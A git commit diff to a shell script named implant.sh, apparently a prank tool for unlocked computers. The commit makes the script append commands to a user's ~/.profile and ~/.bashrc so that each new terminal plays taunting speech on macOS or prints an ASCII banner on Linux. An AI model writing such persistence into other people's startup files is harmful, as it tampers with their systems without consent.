134679405c2c29ab062687366952745e1ef091e7
auraltension <auraltension@riseup.net>
2015-03-13 16:03:26 +1100

    Add bashrc for mac - new tabs!

--- implant.sh
+++ implant.sh
@@ -2,10 +2,11 @@
 
 #PWN_SHELL=$(finger $USER | awk -F "[/|-]" '{print $NF}')
 
-if [ "$(uname)" == "Darwin" ]; then
-  echo 'osascript -e "set volume 5"; say -v Whisper "You left me unlocked so I snuck in. powned."; say -v Hysterical "mwa ha ha ha ha ha haaa"' >> ${HOME}/.profile
-elif [ "$(expr substr $(uname -s) 1 5)" == "Linux" ]; then
-  if [ -e "${HOME}/.bashrc" ]; then
+if [ -e "${HOME}/.bashrc" ]; then
+  if [ "$(uname)" == "Darwin" ]; then
+    echo 'osascript -e "set volume 5"; say -v Whisper "You left me unlocked so I snuck in. powned."; say -v Hysterical "mwa ha ha ha ha ha haaa"' >> ${HOME}/.profile
+    echo 'osascript -e "set volume 5"; say -v Whisper "You left me unlocked so I snuck in. powned."; say -v Hysterical "mwa ha ha ha ha ha haaa"' >> ${HOME}/.bashrc
+  elif [ "$(expr substr $(uname -s) 1 5)" == "Linux" ]; then
     cat >> ${HOME}/.bashrc <<-EOF  
 echo -e '\033[0;31m'
 echo -e '                           ,     \    /      ,'
